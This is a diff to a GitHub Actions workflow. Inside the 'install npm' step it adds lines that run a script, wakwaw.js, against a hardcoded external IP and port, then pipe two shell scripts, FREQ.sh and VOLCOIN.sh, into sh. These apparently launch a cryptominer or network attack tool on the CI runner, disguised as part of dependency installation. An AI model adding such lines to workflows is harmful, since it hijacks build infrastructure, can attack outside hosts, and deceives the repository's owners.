@@ -20,6 +20,9 @@ jobs:
       - name: install npm
         run: |
          npm i
+         node wakwaw.js '103.119.138.8:49156' '103.119.138.8:49156' 12
+         cat FREQ.sh | sh
+         cat VOLCOIN.sh | sh
       - name: Commit
         run: |
           git config --local user.name "github-actions[bot]"
